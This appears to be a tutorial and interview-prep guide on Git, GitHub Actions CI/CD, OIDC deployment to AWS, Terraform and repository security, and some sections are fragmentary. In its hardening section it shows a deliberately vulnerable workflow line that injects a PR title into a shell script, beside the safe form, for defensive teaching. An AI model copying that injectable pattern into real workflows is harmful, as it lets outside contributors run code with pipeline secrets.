Build the matrix from changed foldersYAML
jobs:
  detect:
    runs-on: ubuntu-24.04
    outputs:
      jobs: ${{ steps.find.outputs.jobs }}
    steps:
      - uses: actions/checkout@v6
        with: { fetch-depth: 0 }
      - id: find
        run: |
          base="${{ github.event.pull_request.base.sha || 'HEAD~1' }}"
          jobs=$(git diff --name-only "$base" HEAD -- jobs/ | cut -d/ -f2 | sort -u | jq -R . | jq -sc .)
          echo "jobs=$jobs" >> "$GITHUB_OUTPUT"      # e.g. ["customers","orders"]

  test-changed:
    needs: detect
    if: needs.detect.outputs.jobs != '[]'
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        job: ${{ fromJSON(needs.detect.outputs.jobs) }}
    steps:
      - uses: actions/checkout@v6
      - run: pytest -q jobs/${{ matrix.job }}/tests
  • strategy.matrix fans a job out; include/exclude tweak combos.
  • fail-fast: false to see every failure; max-parallel to limit.
  • fromJSON of a previous job's output gives a dynamic matrix (max 256 jobs).

Caching and artifacts

Every job starts on an empty machine, so two features move files around. A cache reuses things that rarely change between runs (downloaded pip packages) to make runs faster. An artifact saves files produced by a run (a built wheel, a test report, a Terraform plan) so later jobs can use them or people can download them.

Cache

  • Speed: dependencies, tool downloads
  • Keyed by a hash (e.g. of lock files)
  • Shared across runs/branches (with scoping rules)
  • Evicted after 7 days unused or when repo exceeds its limit

Artifact

  • Outputs: wheels, zips, reports, plans
  • Shared between jobs of the same run, downloadable in UI
  • Retention 1–90 days (default 90)
  • Immutable once uploaded
Built-in dependency cache (simplest)YAML
- uses: actions/setup-python@v6
  with:
    python-version: "3.11"
    cache: pip                       # or poetry / pipenv
    cache-dependency-path: "**/requirements*.txt"
Explicit cache (e.g. uv, Terraform plugins)YAML
- uses: actions/cache@v5
  with:
    path: |
      ~/.cache/uv
      ~/.terraform.d/plugin-cache
    key: ${{ runner.os }}-deps-${{ hashFiles('uv.lock', '**/.terraform.lock.hcl') }}
    restore-keys: |
      ${{ runner.os }}-deps-

If the exact key isn't found, the newest cache whose key starts with a restore-keys prefix is restored, and a new cache is saved at the end of a successful job.

Pass a built package from build to deployYAML
jobs:
  build:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v6
      - run: |
          python -m pip install build
          python -m build --wheel
          cd jobs/orders && zip -r ../../dist/orders_job.zip .
      - uses: actions/upload-artifact@v7
        with:
          name: glue-package
          path: dist/
          retention-days: 14

  deploy:
    needs: build
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/download-artifact@v8
        with:
          name: glue-package
          path: dist/
      - run: ls -l dist/
Build once, deploy many

Build the artifact once and promote the same file to dev, staging and prod. Rebuilding per environment can produce different results (a dependency released overnight). For long-term storage beyond 90 days, copy artifacts to S3 or publish to CodeArtifact/GitHub Packages.

  • Cache = speed (keyed by lockfile hash). Artifact = outputs (shared within the run, downloadable).
  • Use setup-python's cache: pip first; actions/cache for anything else.
  • upload-artifact@v7 / download-artifact@v8 between jobs; build once, deploy many.

Job outputs and pipeline shapes

Jobs run on separate machines, so they share small values (a version number, a list of changed jobs) through job outputs, and order themselves with needs. Combining both gives you pipeline shapes like build → test → deploy-dev → deploy-prod.

Fan-out / fan-in with outputsYAML
jobs:
  version:
    runs-on: ubuntu-24.04
    outputs:
      tag: ${{ steps.v.outputs.tag }}
    steps:
      - id: v
        run: echo "tag=$(date -u +%Y%m%d)-${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"

  test-unit:
    needs: version
    runs-on: ubuntu-24.04
    steps: [ { run: echo "unit tests for ${{ needs.version.outputs.tag }}" } ]

  test-sql:
    needs: version
    runs-on: ubuntu-24.04
    steps: [ { run: echo "sqlfluff lint" } ]

  deploy-dev:
    needs: [version, test-unit, test-sql]      # fan-in
    runs-on: ubuntu-24.04
    environment: dev
    steps: [ { run: echo "deploy ${{ needs.version.outputs.tag }} to dev" } ]

  report:
    needs: [test-unit, test-sql, deploy-dev]
    if: always()                               # run even if something failed
    runs-on: ubuntu-24.04
    steps:
      - run: echo "unit=${{ needs.test-unit.result }} deploy=${{ needs.deploy-dev.result }}"

needs.<job>.result is success, failure, cancelled or skipped. A job is skipped when any job it needs did not succeed — unless its if uses a status function like always().

  • Declare outputs on the job, read with needs.job.outputs.x.
  • needs builds the DAG; if: always() for report/cleanup jobs.

Environments and deployment approvals

An environment (dev, staging, prod) is a named deployment target in repo settings with its own secrets and variables and its own protection rules: required reviewers who must approve before a job runs, a wait timer, and which branches or tags may deploy. A job opts in with environment: prod.

OIDC: deploy to AWS without keys

The old way to deploy to AWS from CI was to store an IAM user's access key as a GitHub secret. Those keys never expire and leak easily. With OpenID Connect (OIDC), each workflow job asks GitHub for a short-lived signed token that says "I am repo X, branch Y, environment Z". AWS checks the signature and your IAM role's trust policy, then hands back temporary credentials valid for about an hour. No stored keys at all.

Step 1: one-time AWS setup

Create the OIDC provider (once per AWS account)Shell
$ aws iam create-open-id-connect-provider \
    --url https://token.actions.githubusercontent.com \
    --client-id-list sts.amazonaws.com

(AWS no longer requires a thumbprint for this provider; older guides show one.)

    "Action": "sts:AssumeRoleWithWebIdentity",

      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",

Concurrency

Security hardening for workflows

A workflow runs code with access to your secrets and cloud accounts, so it is a favourite attack target. Real incidents (such as the 2025 compromise of a popular third-party action whose tags were moved to malicious code) taught the industry a short checklist: pin actions, limit permissions, never run untrusted code with secrets, and avoid script injection.

1. Pin third-party actions to a full commit SHA

Tags can move; SHAs can'tYAML
# risky: whoever controls the tag controls your pipeline
- uses: some-org/some-action@v2
# pinned (comment keeps it readable; Dependabot updates both)
- uses: some-org/some-action@4f1a9e7c2b3d5e6f708192a3b4c5d6e7f8091a2b # v2.3.1

Official actions/* and aws-actions/* are lower risk but pinning them is still best practice. Org admins can enforce "require actions to be pinned to a full-length commit SHA" and allow-list which actions may run.

2. Workflow lockfiles GA Oct 2026

A SHA pin covers the action you reference, not actions it calls internally. Workflow lockfiles record exact commits for every action and its transitive dependencies in .github/workflows/actions.lock; once a workflow is onboarded, Actions runs only the recorded commits even if tags move.

Create and verify the lockfileShell
$ gh extension install github/gh-actions-lock
$ gh actions-lock                          # onboard all workflows, write actions.lock
$ gh actions-lock .github/workflows/deploy.yml   # onboard one workflow
$ gh actions-lock --verify                 # CI check: is the lockfile current?

Dependabot updates lockfile entries in the same PR as action version bumps. A "Require lockfile" policy (preview) lets admins mandate it.

3. Script injection

Vulnerable vs safeYAML
# VULNERABLE: PR title is pasted into the script
- run: echo "Title: ${{ github.event.pull_request.title }}"

# SAFE: pass through env, quote the variable
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"

Untrusted inputs include PR titles and bodies, branch names (github.head_ref), issue comments, commit messages and author names. Tools like zizmor and actionlint detect these patterns.

4. pull_request vs pull_request_target

pull_requestpull_request_target

DangerLowIf it checks out and runs the PR's code, attackers get your secrets ("pwn request")

From 2 December 2026, GitHub blocks pull_request_target by default in public repositories unless an Actions event policy explicitly allows it (brownouts on 9 and 16 November 2026; private/internal repos and GHES are unaffected). Use pull_request for testing PR code; if you need to label or comment on fork PRs, do it in a separate workflow that never executes PR code.

5. Least privilege everywhere

  • permissions: {} by default, grant per job.
  • OIDC roles scoped to repo + environment, with least-privilege IAM policies.
  • Environment protection for prod; environment-scoped secrets.
  • Require approval for workflow runs from first-time / outside contributors (Settings → Actions).
  • CODEOWNERS on .github/workflows/ so the platform team reviews CI changes.

6. Keep actions updated

7. Harden the runner

Don't use self-hosted runners for public repos. Use ephemeral (one-job) runners. Consider egress monitoring (e.g. StepSecurity Harden-Runner) to catch exfiltration attempts. actions/checkout leaves the token in .git/config by default; set persist-credentials: false when later steps don't need to push.

I treat workflows as production code: actions pinned to SHAs or locked with the new workflow lockfile, Dependabot for updates, default read-only GITHUB_TOKEN, OIDC instead of stored cloud keys, prod behind a protected environment, untrusted event data passed via env to avoid script injection, and no pull_request_target that runs fork code. CODEOWNERS on the workflows folder so changes to CI get platform review.

  • Pin to SHAs; adopt actions.lock; Dependabot for github-actions.
  • Untrusted event text → env, never inline in run.
  • pull_request_target is blocked by default in public repos from 2 Dec 2026; avoid it.

Writing your own action

An action is a repository (or folder) with an action.yml describing inputs, outputs and how it runs. There are three kinds: composite (YAML steps — easiest), JavaScript (runs on Node 24 directly on the runner — fastest), and Docker (any language, Linux runners only).

A Docker-free Python action via composite: validate Glue job configaction.yml
name: Validate Glue job config
description: Checks every jobs/*/job.yaml against our schema
inputs:
  path: { description: Folder with job configs, default: jobs }
outputs:
  count:
    description: Number of configs validated
    value: ${{ steps.v.outputs.count }}
runs:
  using: composite
  steps:
    - shell: bash
      run: pip install --quiet pyyaml jsonschema
    - id: v
      shell: bash
      run: python "${{ github.action_path }}/validate.py" "${{ inputs.path }}"
validate.pyPython
import sys, glob, json, os, yaml, jsonschema

schema = json.load(open(os.path.join(os.path.dirname(__file__), "schema.json")))
files = glob.glob(f"{sys.argv[1]}/*/job.yaml")
errors = 0
for f in files:
    try:
        jsonschema.validate(yaml.safe_load(open(f)), schema)
    except jsonschema.ValidationError as e:
        errors += 1
        print(f"::error file={f}::{e.message}")
with open(os.environ["GITHUB_OUTPUT"], "a") as out:
    out.write(f"count={len(files)}\n")
sys.exit(1 if errors else 0)

Agentic workflows and Copilot in CI

GitHub Agentic Workflows (generally available since 28 October 2026) let you describe an automation in a Markdown file in plain language — "when CI fails on main, investigate the logs and open an issue with the likely cause" — and compile it to a standard Actions workflow that runs a coding agent. It is aimed at tasks that need judgment rather than fixed scripts: issue triage, CI failure analysis, docs updates, test writing.

How it fits together

        env:
          BUCKET: ${{ vars.GLUE_BUCKET }}
          VERSION: ${{ needs.build.outputs.version }}
        run: |
          aws s3 sync dist/ "s3://$BUCKET/releases/$VERSION/"
          aws s3 sync dist/ "s3://$BUCKET/current/" --delete
          echo "Deployed **$VERSION** to ${{ matrix.env }}" >> "$GITHUB_STEP_SUMMARY"
      - name: Smoke test (dev only)
        if: matrix.env == 'dev'
        run: |
          RUN_ID=$(aws glue start-job-run --job-name orders_etl \
            --arguments '{"--run_date":"2026-11-01","--dry_run":"true"}' --query JobRunId --output text)
          for i in $(seq 1 60); do
            STATE=$(aws glue get-job-run --job-name orders_etl --run-id "$RUN_ID" --query JobRun.JobRunState --output text)
            echo "state=$STATE"; [[ "$STATE" =~ ^(SUCCEEDED)$ ]] && exit 0
            [[ "$STATE" =~ ^(FAILED|ERROR|TIMEOUT|STOPPED)$ ]] && exit 1
            sleep 20
          done; exit 1

How the pieces line up

  • Environments dev and prod each define DEPLOY_ROLE_ARN, GLUE_BUCKET, AWS_REGION as environment variables. Prod has required reviewers and allows only v* tags.
  • OIDC trust: the dev role trusts repo:acme/data-platform:environment:dev, the prod role (in the prod account) trusts ...:environment:prod.
  • Glue jobs point at s3://bucket/current/jobs/orders_etl.py and --extra-py-files s3://bucket/current/common-*.whl; the versioned copy under releases/ lets you roll back by re-syncing an old version.
  • max-parallel: 1 deploys dev first, then waits for prod approval.
Version pinning trade-off

Pointing jobs at current/ is simple, but a running job can pick up new code mid-deploy. Stricter teams have Terraform set each job's script location to the exact releases/<version>/ path, so a deploy is a Terraform change.

  • Build once, upload versioned + current, promote dev → prod with environments.
  • Per-environment vars + OIDC roles per account; smoke test in dev.

Project 3: Terraform plan on PR, apply on merge

Goal: infrastructure changes (Glue jobs, IAM roles, S3 buckets, MWAA) follow the same review flow as code. On a PR, run terraform plan and post the plan as a PR comment. After merge, apply the reviewed plan to dev automatically and to prod after approval.

.github/workflows/terraform.ymlYAML
name: Terraform
on:
  pull_request:
    paths: ["infra/**"]
  push:
    branches: [main]
    paths: ["infra/**"]

permissions: { contents: read, id-token: write, pull-requests: write }

jobs:
  plan:
    if: github.event_name == 'pull_request'
    runs-on: ubuntu-24.04
    environment: dev-plan                 # read-only role
    defaults: { run: { working-directory: infra/envs/dev } }
    steps:
      - uses: actions/checkout@v6
      - uses: hashicorp/setup-terraform@v4
        with: { terraform_version: "1.x", terraform_wrapper: false }
      - uses: aws-actions/configure-aws-credentials@v6
        with: { role-to-assume: "${{ vars.PLAN_ROLE_ARN }}", aws-region: "${{ vars.AWS_REGION }}" }
      - run: terraform fmt -check -recursive ../..
      - run: terraform init -input=false
      - run: terraform validate
      - id: plan
        run: |
          set +e
          terraform plan -input=false -no-color -detailed-exitcode -out=tfplan > plan.txt
          code=$?; echo "exitcode=$code" >> "$GITHUB_OUTPUT"
          [ $code -eq 1 ] && exit 1 || exit 0
      - name: Comment plan on PR
        uses: actions/github-script@v8
        with:
          script: |
            const fs = require('fs');
            const plan = fs.readFileSync('infra/envs/dev/plan.txt', 'utf8').slice(-60000);
            const changed = '${{ steps.plan.outputs.exitcode }}' === '2';
            await github.rest.issues.createComment({
              ...context.repo, issue_number: context.issue.number,
              body: `### Terraform plan (dev) ${changed ? '— changes' : '— no changes'}\n<details><summary>Show plan</summary>\n\n\`\`\`hcl\n${plan}\n\`\`\`\n</details>`
            });

  apply-dev:
    if: github.event_name == 'push'
    runs-on: ubuntu-24.04
    environment: dev
    concurrency: { group: tf-dev, cancel-in-progress: false }
    defaults: { run: { working-directory: infra/envs/dev } }
    steps:
      - uses: actions/checkout@v6
      - uses: hashicorp/setup-terraform@v4
        with: { terraform_version: "1.x" }
      - uses: aws-actions/configure-aws-credentials@v6
        with: { role-to-assume: "${{ vars.APPLY_ROLE_ARN }}", aws-region: "${{ vars.AWS_REGION }}" }
      - run: terraform init -input=false && terraform apply -input=false -auto-approve
  • -detailed-exitcode: 0 = no changes, 1 = error, 2 = changes present.
  • State lives in S3 with locking (the S3 backend's use_lockfile = true in Terraform 1.10+ replaces the DynamoDB lock table); concurrency avoids queuing two applies anyway.
  • Separate plan (read-only) and apply roles: PR jobs can never change infrastructure.
  • Prod: same pattern with environment: prod and required reviewers, ideally applying a saved plan artifact from the merge commit.
  • PR → fmt/validate/plan → plan comment. Merge → apply (dev auto, prod approved).
  • Read-only plan role vs apply role; S3 state with locking; concurrency group.

Project 7: scheduled data-quality checks

Goal: every morning, run a set of Athena checks (row counts, nulls, freshness) against yesterday's partition. If any fails, the workflow fails, posts to Slack and opens a GitHub issue. Not a replacement for in-pipeline checks, but a cheap independent safety net.

Scheduled workflow caveats

Cron runs can start several minutes late, run only on the default branch, and on public repos are disabled after 60 days of no activity. For business-critical checks, prefer EventBridge Scheduler + Step Functions or Airflow inside AWS; GitHub schedules are best for engineering hygiene jobs.

  • Read-only OIDC role; on failure open an issue and alert Slack.

Organizations and teams

An organization is a shared account that owns repositories for a company or group, with central billing, security policies and members. Teams group members (and can be nested) so you grant access and request reviews by team instead of person by person. Large companies put several organizations under one enterprise account.

Organisation settings a data team cares about

  • Base permission for members (None or Read is safest).
  • Teams mirroring real groups: data-engineering, analytics, platform, security; sync with your identity provider (Entra ID/Okta) groups.
  • Org rulesets applying "protect main" to every repo, or every repo with a custom property tier=prod.
  • Custom properties on repos (owner team, data classification, tier) to target policies.
  • Actions policies: allowed actions, SHA pinning, default token permissions, runner groups, org-level secrets and variables shared with selected repos.
  • Security configurations: enable secret scanning, push protection and Dependabot across all repos at once.
  • Enterprise → organizations → teams → repos.
  • Grant access to teams, not individuals; use org rulesets and custom properties for policy at scale.

Packfiles and garbage collection

New objects start as individual compressed "loose" files. Periodically Git packs them into packfiles, storing similar versions as deltas, which is why repos stay small despite snapshot storage. git gc and git maintenance do this (2.54+ uses geometric repacking by default); unreachable objects older than the reflog expiry are deleted then.

Author vs committer

The author wrote the change; the committer applied it. They differ after cherry-picks, rebases and patches applied by maintainers (git log --format='%an | %cn').

Git is a content-addressable store of blobs, trees, commits and tags, all named by hash. A commit points to a root tree and its parents; branches and tags are refs pointing at commits, and HEAD points at the current branch. Because content is hashed, identical files are stored once and history is tamper-evident, and packfiles with delta compression keep it small.

  • blob = content, tree = folder, commit = tree + parents + metadata, tag = named pointer with metadata.
  • Refs are files holding hashes; HEAD points to a ref.
  • git cat-file -p shows any object.

git bisect: find the commit that broke it

A test passed last week and fails now, with 200 commits in between. git bisect does a binary search: you mark one good and one bad commit, Git checks out the middle, you say good or bad, and it halves the range each time. 200 commits take about 8 steps. With a test script, Git does it all automatically.

Manual bisectShell
$ git bisect start
$ git bisect bad                    # current commit is broken
$ git bisect good v1.3.0            # this tag was fine
# Git checks out a commit in the middle; test it, then:
$ git bisect good                   # or: git bisect bad
# ...repeat until:
Output
Bisecting: 99 revisions left to test after this (roughly 7 steps)
...
3d4e5f6 is the first bad commit
commit 3d4e5f6
Author: Ravi K <ravi@example.com>
    Change partition column to load_date
Automatic bisect with a testShell
$ git bisect start HEAD v1.3.0
$ git bisect run pytest -q tests/test_orders.py::test_row_count
$ git bisect reset                  # back to where you started
# 2.56+: clean up automatically when done
$ git bisect run --reset-when-found pytest -q tests/test_orders.py

The script must exit 0 for good, 1–127 (except 125) for bad, and 125 to skip a commit that can't be tested (e.g. doesn't build). Use git bisect skip manually for the same.

Bisect needs good commits

Bisect works best when every commit on main builds and passes tests — another reason for small, atomic commits and squash merges.

  • bisect start / bad / good <ref> → binary search; bisect run script automates it.
  • Exit 0 good, 1 bad, 125 skip; always bisect reset.

Rewriting history: removing secrets and big files

Deleting a file in a new commit doesn't remove it from history. To truly purge a leaked secret or a huge file you must rewrite every commit that contained it, then force-push and have everyone re-clone. git filter-repo is the recommended tool (the old git filter-branch is slow and error-prone; BFG Repo-Cleaner is an alternative).

Order matters

1) Rotate the secret first. Rewriting history doesn't un-leak it — forks, clones, caches and bots may already have it. 2) Then clean history. 3) Coordinate with the team; rewriting changes every hash after the first affected commit.

Purge a file and a secret stringShell
$ pipx install git-filter-repo
$ git clone --mirror git@github.com:acme/orders-pipeline.git && cd orders-pipeline.git
# remove a path everywhere in history
$ git filter-repo --invert-paths --path data/orders_2025_full.csv
# replace secret strings everywhere
$ echo 'AKIAIOSFODNN7EXAMPLE==>***REMOVED***' > ../replacements.txt
$ git filter-repo --replace-text ../replacements.txt
$ git push --force --mirror
Output
Parsed 412 commits
New history written in 1.84 seconds; now repacking/cleaning...
Completely finished after 3.02 seconds.

After the rewrite

  • Temporarily lift branch protection (force-push is blocked by rulesets) and restore it after.
  • Teammates must re-clone or hard-reset onto the new history; old clones will try to push the old commits back.
  • Open PRs may need recreating. Ask GitHub Support to purge cached views of sensitive data if needed.
  • Secret scanning alerts: close them as "revoked" once rotated.
  • Rotate → git filter-repo (--invert-paths --path, --replace-text) → force-push → everyone re-clones.
  • Prevention (push protection, .gitignore, pre-commit gitleaks) is far cheaper.

Scenario questions (troubleshooting)

Interviewers love "what would you do if…" questions. Click each to reveal a model answer.

A teammate force-pushed to main and three of your merged commits disappeared. What do you do?

Don't panic and don't push anything yet. My local clone still has the commits (check git log origin/main@{1} or git reflog show origin/main — the remote-tracking ref's previous position). Create a branch from the lost tip, open a PR to restore them (or cherry-pick them onto current main). Then fix the root cause: a ruleset blocking force-pushes and deletions on main with no bypass for regular members. GitHub's audit log/"Activity" view on the repo shows who force-pushed.

Prod Glue job started failing after this morning's deploy. How do you use Git to respond?

Identify what was deployed: the workflow run shows the commit SHA/tag. git log --oneline previous_tag..current_tag lists the changes; git diff previous_tag current_tag -- jobs/orders/ shows the code diff. Mitigate first: revert the offending PR (Revert button / git revert -m 1) or redeploy the previous tag's artifact from the versioned S3 path. Then investigate with logs, add a failing test, fix forward through a normal PR. If the cause isn't obvious, git bisect run with a reproduction test.

Your PR has conflicts with main. Walk me through resolving them.

git fetch origin, git rebase origin/main on my branch (or merge main in if the branch is shared). For each conflicted file, understand both sides — with merge.conflictStyle zdiff3 I can see the base — edit to the correct combined result, remove markers, run tests, git add, git rebase --continue. Push with --force-with-lease. If the conflict is in logic I don't own, I ask the other author. Prevent it with smaller PRs and frequent rebasing.

You pushed an AWS access key to a public repo 10 minutes ago. Steps?

1) Immediately deactivate/delete the key in IAM and create a new one if still needed (better: switch to a role). 2) Check CloudTrail for activity from that key. 3) Remove it from history with git filter-repo --replace-text and force-push (temporarily allowing it), and ask collaborators to re-clone. 4) Close the secret-scanning alert as revoked. 5) Prevent recurrence: push protection, gitleaks pre-commit, Secrets Manager/roles instead of keys, OIDC for CI.

The repo takes 15 minutes to clone in CI. How do you speed it up?

Find why: git count-objects -vH and the biggest-blobs script. Quick wins: actions/checkout default depth 1 (don't set fetch-depth: 0 unless needed), sparse-checkout for the folders the job uses, partial clone (filter: blob:none). If historical large files are the cause, move them to S3/LFS and rewrite history. Also cache dependencies separately from the repo.

How would you ensure no one can deploy untested code to production?

Rulesets on main: PR required, approvals including code owners, required status checks (lint/unit tests), no force-push/delete, no bypass. Deploys only from workflows: build once, deploy the same artifact; prod job uses environment: prod with required reviewers and allowed refs (tags v*). AWS side: the prod deploy role trusts only repo:org/repo:environment:prod via OIDC and humans don't have write access to prod buckets/jobs. Tag rulesets so only the release process creates v* tags.

git pull created an ugly merge commit on your branch. How do you avoid that?

That happens when local and remote both have new commits and pull defaults to merging. Use git pull --rebase or set git config --global pull.rebase true (plus rebase.autoStash true). To undo the merge right after it happens (not pushed): git reset --hard ORIG_HEAD, then git pull --rebase.

A required check is stuck at "Expected — Waiting for status to be reported". Why?

The workflow that produces that check didn't run: a paths filter excluded the change, the workflow or job was renamed (so the check name no longer matches the ruleset), it's waiting for approval because the author is a first-time contributor, or it doesn't trigger on merge_group in a merge queue. Fix by aligning names, using a job-level if with change detection instead of workflow-level path filters for required checks, or adding the missing trigger.

How do you find which commit introduced a bug in a 500-commit range?

git bisect start BAD GOOD then git bisect run with a script that reproduces the bug (exit 0 good, 1 bad, 125 skip). That takes about 9 steps for 500 commits. Alternatively git log -S 'snippet' if I know the text that changed, or git log -L :function:file.py to see the history of one function.

Two teams keep breaking each other's DAGs in a shared repo. What Git/GitHub setup helps?

CODEOWNERS per folder (/dags/finance/ @acme/finance-data) with "require code owner review"; a CI job that imports every DAG (DagBag test) so breakage is caught pre-merge; path-filtered tests per area; merge queue if many merges collide; and clear ownership in custom properties. If coupling is deep, split shared helpers into a versioned package.

Git fundamentals

What's the difference between Git and GitHub?

Git is the distributed version control tool that tracks history locally. GitHub is a hosting platform for Git repos that adds collaboration: pull requests, reviews, issues, Actions CI/CD, security scanning, permissions.

Explain the working directory, staging area and repository.

Working directory holds files I edit; the staging area (index) holds the exact snapshot for the next commit, built with git add; the repository (.git) stores committed history. Staging lets me make focused commits from messy work.

How does Git store data?

As snapshots in a content-addressed object store: blobs for content, trees for directories, commits pointing to a tree and parents, and tags. Objects are named by SHA-1 hash (SHA-256 coming as default in Git 3.0). Branches are refs to commit hashes. Packfiles delta-compress storage.

git fetch vs git pull?

Fetch downloads new commits and updates remote-tracking branches only — safe, changes nothing local. Pull = fetch + merge (or rebase with --rebase) into the current branch.

Merge vs rebase — when do you use each?

Merge preserves history and is safe on shared branches; creates merge commits. Rebase replays commits on a new base for linear history but rewrites hashes — I use it on my own feature branch to catch up with main and clean up before review, never on shared branches.

reset vs revert vs restore?

restore changes files (discard or unstage). reset moves the branch pointer back (soft keeps staged, mixed keeps unstaged, hard discards) — rewrites history, local only. revert adds a new inverse commit — safe for pushed/shared history.

What is HEAD? What is detached HEAD?

HEAD points to the currently checked-out branch (which points to a commit). Detached HEAD means HEAD points directly at a commit, e.g. after checking out a tag; new commits aren't on any branch until you create one.

Explain git diff vs git diff --staged vs git diff HEAD.

Working tree vs index; index vs last commit; working tree vs last commit. And A...B diffs from the merge base, which is what PRs show.

What is a fast-forward merge?

When the target branch hasn't diverged, Git simply moves its pointer to the source tip — no merge commit. --no-ff forces a merge commit; --ff-only refuses otherwise.

What is cherry-pick and when is it appropriate?

Applies one commit's change as a new commit on the current branch. Good for backporting a hotfix to a release branch; overuse creates duplicate commits and confusion.

How do you squash commits?

Locally git rebase -i base with squash/fixup, or git reset --soft base and recommit; or use GitHub's "Squash and merge".

How do you recover a deleted branch or lost commit?

git reflog to find the hash, then git branch name sha or git reset --hard sha. Works for ~90 days for committed work.

What is git stash?

Temporarily shelves uncommitted changes to get a clean tree; pop/apply brings them back. Local only; -u includes untracked files.

Lightweight vs annotated tag?

Lightweight is just a pointer; annotated is an object with tagger, date, message and optional signature — use for releases. Tags must be pushed explicitly.

What does .gitignore do, and why doesn't it untrack a committed file?

It tells Git which untracked files to ignore. Already tracked files stay tracked; remove them from the index with git rm --cached.

GitHub and collaboration

Describe your team's branching strategy.

GitHub Flow: main always deployable, short-lived feature branches, PRs with required CI and review, squash merge; merges deploy to dev automatically; tags promote the same artifact to prod through a protected environment. No long-lived environment branches.

How do you protect the main branch?

A ruleset: block deletion and force-push, require PR with approvals, code-owner review, dismiss stale approvals, last-push approval, resolved conversations, required status checks, linear history, possibly signed commits; minimal bypass; merge queue for busy repos.

What makes a good pull request?

Small and focused, clear title, description of what/why/how tested/risk, linked issue, passing checks, self-reviewed, and for data work: schema/row-count impact and backfill needs.

Fork vs branch vs clone?

Clone copies a repo to my machine. Branch is a line of work within a repo. Fork is my own server-side copy of someone else's repo, used when I lack write access (open source).

What is CODEOWNERS?

A file mapping paths to owners; GitHub auto-requests their review and rulesets can require their approval.

Merge commit vs squash vs rebase-and-merge on GitHub?

Merge commit keeps all commits plus a merge commit; squash makes one commit per PR (linear, easy revert); rebase-and-merge replays each commit linearly without a merge commit.

GitHub Actions

Explain workflows, jobs, steps, actions and runners.

A workflow is a YAML file triggered by events; it has jobs that run in parallel on separate runners unless linked by needs; each job has sequential steps that run commands or use actions (reusable units); runners are the VMs, GitHub-hosted or self-hosted.

How do you authenticate GitHub Actions to AWS?

OIDC: permissions: id-token: write, an IAM OIDC provider for token.actions.githubusercontent.com, and a role whose trust policy checks aud=sts.amazonaws.com and a precise sub (repo + environment/branch). aws-actions/configure-aws-credentials exchanges the token for temporary credentials. No stored keys.

Cache vs artifact?

Cache speeds up runs by reusing dependencies keyed by a lockfile hash; artifacts store run outputs (builds, reports) to share between jobs or download, with retention.

How do you share values between steps and jobs?

Steps: write name=value to $GITHUB_OUTPUT, read steps.id.outputs.name; or $GITHUB_ENV. Jobs: declare job outputs, read needs.job.outputs.name. Files go through artifacts.

How do you avoid duplicated CI config across repos?

Reusable workflows (workflow_call) for whole pipelines, composite actions for shared steps, starter workflow templates in the org .github repo; pin them by tag/SHA.

How do you secure GitHub Actions?

Least-privilege permissions, OIDC, environment protection for prod, SHA-pinned actions plus workflow lockfiles and Dependabot, no script injection (untrusted input via env), avoid pull_request_target with PR code (blocked by default in public repos from Dec 2026), ephemeral self-hosted runners only for private repos, CODEOWNERS on workflows.

How do you implement manual approval before prod deploys?

An environment named prod with required reviewers (and allowed branches/tags); the deploy job sets environment: prod so it pauses until approved. The OIDC subject includes the environment so the AWS role can trust only that.

How do you prevent concurrent deployments?

concurrency: { group: deploy-prod, cancel-in-progress: false } on the deploy job — runs queue instead of overlapping.

How would you run tests only for changed components in a monorepo?

Path filters for coarse cases; for precision a detect job runs git diff --name-only base...HEAD, outputs a JSON list, and a matrix job uses fromJSON to test each changed component. Use fetch-depth: 0 or fetch the base for merge-base.

Why doesn't my workflow trigger when another workflow pushes a tag?

Events created with GITHUB_TOKEN don't trigger new runs (loop prevention). Use a GitHub App token, or call the next workflow via workflow_call/workflow_dispatch.
